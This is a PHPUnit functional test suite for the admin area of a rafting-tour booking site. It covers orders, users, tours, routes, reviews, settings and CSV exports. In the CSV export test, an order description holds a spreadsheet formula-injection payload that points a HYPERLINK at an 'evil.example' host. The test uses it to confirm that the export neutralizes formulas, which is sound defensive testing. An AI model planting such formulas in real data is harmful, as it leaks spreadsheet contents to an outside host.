<?php

declare(strict_types=1);

namespace App\Tests\Functional;

use App\Entity\RaftingRoute;
use App\Entity\Review;
use App\Entity\Tour;
use App\Enum\OrderStatus;
use App\Enum\ReviewStatus;
use App\Repository\OrderRepository;
use App\Repository\TourRepository;
use App\Tests\Support\WebTestCase;
use PHPUnit\Framework\Attributes\DataProvider;

final class AdminTest extends WebTestCase
{
    /**
     * @return iterable<array{string}>
     */
    public static function adminPages(): iterable
    {
        foreach (['', '/orders', '/orders/new', '/orders/calendar', '/orders/day/'.date('Y-m-d', strtotime('+2 days')), '/users', '/users/new', '/tours', '/tours/new', '/routes', '/routes/new', '/reviews', '/requests', '/settings', '/emails', '/logs'] as $path) {
            yield $path ?: 'dashboard' => ['/ru/admin'.$path];
        }
    }

    #[DataProvider('adminPages')]
    public function testAdminPagesWork(string $url): void
    {
        $this->factory->order('+2 days');
        $this->client->loginUser($this->factory->admin());

        $this->client->request('GET', $url);

        self::assertResponseIsSuccessful();
        self::assertSelectorExists('.admin-sidebar');
    }

    public function testDaySheetAndSubscribersExport(): void
    {
        $order = $this->factory->order('+3 days', people: 7);
        $this->factory->user('news@example.com')->setMarketingConsent(true);
        $this->factory->user('quiet@example.com');
        $this->em->flush();
        $this->client->loginUser($this->factory->admin());

        $this->client->request('GET', '/ru/admin/orders/day/'.$order->getStartDate()?->format('Y-m-d'));
        self::assertResponseIsSuccessful();
        self::assertSelectorTextContains('table', $order->getReference());
        self::assertSelectorTextContains('.admin-main', 'участников: 7');

        $this->client->request('GET', '/ru/admin/users/subscribers.csv');
        $csv = (string) $this->client->getInternalResponse()->getContent();
        self::assertStringContainsString('news@example.com', $csv);
        self::assertStringNotContainsString('quiet@example.com', $csv);
    }

    public function testRegularUsersAreDenied(): void
    {
        $this->client->loginUser($this->factory->user());

        $this->client->request('GET', '/ru/admin');
        self::assertResponseStatusCodeSame(403);
    }

    public function testConfirmingAnOrderNotifiesTheCustomer(): void
    {
        $order = $this->factory->order('+6 days');
        $this->client->loginUser($this->factory->admin());

        $crawler = $this->client->request('GET', '/ru/admin/orders/'.$order->getId().'/edit');
        $this->submit($crawler, 'Сохранить', [
            'order_admin[status]' => 'confirmed',
            'order_admin[adminNote]' => 'Позвонили, всё ок',
        ]);

        self::assertResponseRedirects('/ru/admin/orders/'.$order->getId().'/edit');
        $order = $this->reload($order);
        self::assertSame(OrderStatus::CONFIRMED, $order->getStatus());
        self::assertSame('Позвонили, всё ок', $order->getAdminNote());
        self::assertEmailCount(1);
        self::assertEmailSubjectContains($this->email(), $order->getReference());
    }

    public function testCreatingAPhoneBooking(): void
    {
        $this->client->loginUser($this->factory->admin());

        $crawler = $this->client->request('GET', '/ru/admin/orders/new?date='.(new \DateTimeImmutable('+9 days'))->format('Y-m-d'));
        $this->submit($crawler, 'Сохранить', [
            'order_admin[status]' => 'confirmed',
            'order_admin[name]' => 'Звонок',
            'order_admin[phone]' => '+375291112233',
            'order_admin[email]' => 'phone@example.com',
            'order_admin[durationDays]' => '1',
            'order_admin[amountOfPeople]' => '3',
            'order_admin[river]' => 'svisloch',
            'order_admin[package]' => 'minimum',
            'order_admin[notifyCustomer]' => false,
        ]);

        $order = static::getContainer()->get(OrderRepository::class)->findOneBy(['email' => 'phone@example.com']);
        self::assertNotNull($order);
        self::assertResponseRedirects('/ru/admin/orders/'.$order->getId().'/edit');
        self::assertEmailCount(0);
    }

    public function testFiltersAndCsvExport(): void
    {
        $match = $this->factory->order('+3 days', email: 'match@example.com');
        $match->setDescription('=HYPERLINK("http://evil.example/?"&A1,"x")');
        $this->em->flush();
        $this->factory->order('+3 days', status: OrderStatus::CANCELLED, email: 'cancelled@example.com');
        $this->client->loginUser($this->factory->admin());

        $this->client->request('GET', '/ru/admin/orders?status=new');
        self::assertSelectorTextContains('table', 'match@example.com');
        self::assertSelectorTextNotContains('table', 'cancelled@example.com');

        $this->client->request('GET', '/ru/admin/orders/export.csv?status=new');
        $csv = $this->client->getInternalResponse()->getContent();
        self::assertResponseIsSuccessful();
        self::assertResponseHeaderSame('Content-Type', 'text/csv; charset=UTF-8');
        self::assertStringContainsString($match->getReference(), (string) $csv);
        self::assertStringNotContainsString('cancelled@example.com', (string) $csv);
        self::assertStringContainsString("'=HYPERLINK", (string) $csv, 'Formulas are neutralized for Excel');
    }

    public function testAdminCannotDeleteThemselves(): void
    {
        $admin = $this->factory->admin();
        $this->client->loginUser($admin);

        $this->client->request('POST', '/ru/admin/users/'.$admin->getId().'/delete', ['_token' => 'invalid']);
        self::assertResponseRedirects('/ru/admin/users');
        $this->client->followRedirect();
        self::assertSelectorExists('.alert-error');
        self::assertNotNull($this->em->find(\App\Entity\User::class, $admin->getId()));
    }

    public function testTourManagement(): void
    {
        $this->client->loginUser($this->factory->admin());

        $crawler = $this->client->request('GET', '/ru/admin/tours/new');
        $this->submit($crawler, 'Сохранить', [
            'tour[title][ru]' => 'Сплав по Березине',
            'tour[title][en]' => 'Berezina trip',
            'tour[slug]' => 'berezina',
            'tour[summary][ru]' => 'Три дня на легендарной реке',
            'tour[package]' => 'all_inclusive',
            'tour[river]' => 'berezina',
            'tour[durationDays]' => '3',
            'tour[priceFrom]' => '390',
            'tour[priceUnit]' => 'person',
            'tour[position]' => '10',
            'tour[isActive]' => '1',
        ]);
        self::assertResponseRedirects('/ru/admin/tours');

        $tour = static::getContainer()->get(TourRepository::class)->findOneActiveBySlug('berezina');
        self::assertInstanceOf(Tour::class, $tour);
        self::assertSame('Berezina trip', $tour->getLocalizedTitle('en'));
        self::assertSame('Сплав по Березине', $tour->getLocalizedTitle('be'), 'Falls back to Russian');

        $this->client->request('GET', '/en/tours/berezina');
        self::assertResponseIsSuccessful();
        self::assertSelectorTextContains('h1', 'Berezina trip');
    }

    public function testRouteManagement(): void
    {
        $this->client->loginUser($this->factory->admin());

        $crawler = $this->client->request('GET', '/ru/admin/routes/new');
        $form = $crawler->selectButton('Сохранить')->form();
        $values = $form->getPhpValues();
        $values['rafting_route']['name']['ru'] = 'Неман: Гродно';
        $values['rafting_route']['slug'] = 'neman-grodno';
        $values['rafting_route']['difficulty'] = 'medium';
        $values['rafting_route']['points'] = [
            ['lat' => '53.68', 'lng' => '23.83', 'type' => 'start', 'name' => ['ru' => 'Старт'], 'description' => []],
            ['lat' => '53.70', 'lng' => '23.90', 'type' => 'point', 'name' => ['ru' => 'Стоянка'], 'description' => []],
            ['lat' => '53.72', 'lng' => '23.95', 'type' => 'end', 'name' => ['ru' => 'Финиш'], 'description' => []],
        ];
        $this->client->request('POST', $form->getUri(), $values);

        $route = $this->em->getRepository(RaftingRoute::class)->findOneBy(['slug' => 'neman-grodno']);
        self::assertInstanceOf(RaftingRoute::class, $route);
        self::assertResponseRedirects('/ru/admin/routes/'.$route->getId().'/edit');
        self::assertCount(3, $route->getPoints());
        self::assertSame('end', $route->getPoints()[2]['type']);

        $crawler = $this->client->request('GET', '/ru/');
        self::assertStringContainsString('neman-grodno', (string) $crawler->filter('[data-controller="map"]')->attr('data-map-routes-value'));
    }

    public function testReviewModeration(): void
    {
        $review = (new Review())->setAuthorName('Ольга')->setRating(5)->setText('Лучший сплав в моей жизни!');
        $this->em->persist($review);
        $this->em->flush();
        $this->client->loginUser($this->factory->admin());

        $this->client->request('GET', '/ru/');
        self::assertSelectorNotExists('#reviews');

        $crawler = $this->client->request('GET', '/ru/admin/reviews');
        $this->submit($crawler, 'Опубликовать');
        $review = $this->reload($review);
        self::assertSame(ReviewStatus::APPROVED, $review->getStatus());

        $this->client->request('GET', '/ru/');
        self::assertSelectorTextContains('#reviews', 'Лучший сплав в моей жизни!');
    }

    public function testSettingsChangeTheSite(): void
    {
        $this->client->loginUser($this->factory->admin());

        $crawler = $this->client->request('GET', '/ru/admin/settings');
        $this->submit($crawler, 'Сохранить', [
            'settings[phone]' => '+375 33 000-00-00',
            'settings[announcement][ru]' => 'Сезон открыт!',
            'settings[booking_enabled]' => false,
        ]);
        self::assertResponseRedirects('/ru/admin/settings');

        $this->client->request('GET', '/ru/');
        self::assertSelectorTextContains('.announcement', 'Сезон открыт!');
        self::assertSelectorTextContains('footer', '+375 33 000-00-00');

        $this->client->request('GET', '/ru/booking');
        self::assertSelectorTextContains('h1', 'временно закрыто');
    }
}
